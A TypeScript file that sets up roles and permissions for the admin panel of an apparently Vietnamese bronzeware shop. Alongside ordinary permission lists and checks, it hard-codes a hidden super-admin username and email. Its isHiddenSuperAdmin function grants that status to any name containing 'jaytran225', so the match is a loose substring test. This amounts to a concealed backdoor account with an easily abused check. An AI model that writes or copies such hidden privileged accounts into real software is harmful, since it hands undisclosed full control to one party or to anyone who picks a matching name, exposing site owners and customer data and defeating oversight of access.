// Role-Based Access Control (RBAC) System for Đồ Đồng Lộc Nam

export const HIDDEN_SUPER_ADMIN = "jaytran225";
export const HIDDEN_SUPER_ADMIN_EMAIL = "jaytran225@ducdonglocnam.com";

export type RoleType = "SUPER_ADMIN" | "ADMIN" | "EDITOR" | "STAFF";

export interface PermissionDefinition {
  id: string;
  name: string;
  group: string;
  description: string;
}

export const ALL_PERMISSIONS: PermissionDefinition[] = [
  {
    id: "products",
    name: "Quản Lý Sản Phẩm",
    group: "Bán Hàng & Nội Dung",
    description: "Thêm mới, chỉnh sửa giá bán, cập nhật kho hàng, xóa sản phẩm",
  },
  {
    id: "categories",
    name: "Danh Mục & Thẻ Con",
    group: "Bán Hàng & Nội Dung",
    description: "Cấu hình phân cấp danh mục chính và hệ thống thẻ con",
  },
  {
    id: "orders",
    name: "Quản Lý Đơn Hàng",
    group: "Kinh Doanh & Vận Hành",
    description: "Xem chi tiết đơn mua hàng, đổi trạng thái xử lý/giao hàng, xuất file",
  },
  {
    id: "articles",
    name: "Bài Viết Chuẩn SEO",
    group: "Bán Hàng & Nội Dung",
    description: "Soạn thảo cẩm nang đồ đồng, kiến thức phong thủy thờ cúng",
  },
  {
    id: "landing",
    name: "Giao Diện & Trang Chủ",
    group: "Cấu Hình & Hệ Thống",
    description: "Cấu hình banner slider, số hotline, cam kết, chính sách và chân trang",
  },
  {
    id: "customers",
    name: "Khách Hàng & Liên Hệ",
    group: "Kinh Doanh & Vận Hành",
    description: "Xem danh sách khách hàng và tiếp nhận form tư vấn đặt hàng",
  },
  {
    id: "users",
    name: "Tài Khoản & Phân Quyền",
    group: "Cấu Hình & Hệ Thống",
    description: "Tạo tài khoản thành viên, phân quyền hạn, kích hoạt và đặt lại mật khẩu",
  },
  {
    id: "logs",
    name: "Lịch Sử Hoạt Động",
    group: "Cấu Hình & Hệ Thống",
    description: "Theo dõi nhật ký thao tác và dòng thời gian hoạt động của nhân viên",
  },
];

export const ROLE_DEFAULT_PERMISSIONS: Record<RoleType, string[]> = {
  SUPER_ADMIN: ALL_PERMISSIONS.map((p) => p.id),
  ADMIN: ALL_PERMISSIONS.map((p) => p.id),
  EDITOR: ["products", "categories", "articles"],
  STAFF: ["orders", "customers", "products"],
};

export const ROLE_LABELS: Record<RoleType, { label: string; badgeColor: string; description: string }> = {
  SUPER_ADMIN: {
    label: "Siêu Quản Trị Tối Cao",
    badgeColor: "bg-amber-500/20 text-amber-400 border-amber-500/40",
    description: "Toàn quyền kiểm soát hệ thống, bảo mật tối cao",
  },
  ADMIN: {
    label: "Quản Trị Viên Hệ Thống",
    badgeColor: "bg-blue-500/20 text-blue-400 border-blue-500/40",
    description: "Quản lý toàn bộ chức năng, đơn hàng và tài khoản nhân viên",
  },
  EDITOR: {
    label: "Biên Tập Viên Nội Dung",
    badgeColor: "bg-emerald-500/20 text-emerald-400 border-emerald-500/40",
    description: "Quản lý sản phẩm, viết bài viết chuẩn SEO và cây danh mục",
  },
  STAFF: {
    label: "Nhân Viên Kinh Doanh & Kho",
    badgeColor: "bg-purple-500/20 text-purple-400 border-purple-500/40",
    description: "Xem và xử lý đơn hàng, theo dõi khách đặt mua",
  },
};

export function isHiddenSuperAdmin(emailOrUsername?: string | null): boolean {
  if (!emailOrUsername) return false;
  const lower = emailOrUsername.toLowerCase().trim();
  return lower.includes("jaytran225");
}

export function parsePermissions(permissionsJson?: string | null): string[] {
  if (!permissionsJson) return [];
  try {
    const parsed = JSON.parse(permissionsJson);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return permissionsJson.split(",").map((s) => s.trim()).filter(Boolean);
  }
}

export function checkUserPermission(
  userRole: string,
  userPermissionsJson: string | null | undefined,
  requiredPermission: string
): boolean {
  if (userRole === "SUPER_ADMIN") return true;
  if (userRole === "ADMIN") return true;

  const perms = parsePermissions(userPermissionsJson);
  if (perms.length === 0) {
    const roleKey = userRole as RoleType;
    const defaultPerms = ROLE_DEFAULT_PERMISSIONS[roleKey] || [];
    return defaultPerms.includes(requiredPermission);
  }
  return perms.includes(requiredPermission);
}
